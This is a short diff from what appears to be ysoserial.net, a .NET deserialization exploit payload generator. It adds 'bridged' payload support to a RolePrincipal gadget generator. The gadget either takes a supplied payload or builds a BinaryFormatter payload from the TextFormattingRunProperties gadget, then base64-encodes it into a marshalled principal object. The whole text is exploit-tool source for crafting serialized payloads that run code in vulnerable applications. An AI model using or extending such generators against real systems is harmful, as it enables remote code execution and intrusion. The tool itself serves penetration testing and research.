@@ -27,10 +27,24 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            IGenerator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                IGenerator generator = new TextFormattingRunPropertiesGenerator();
+                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            }
+
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
             
             var payloadClaimsPrincipalMarshal = new RolePrincipalMarshal(b64encoded);
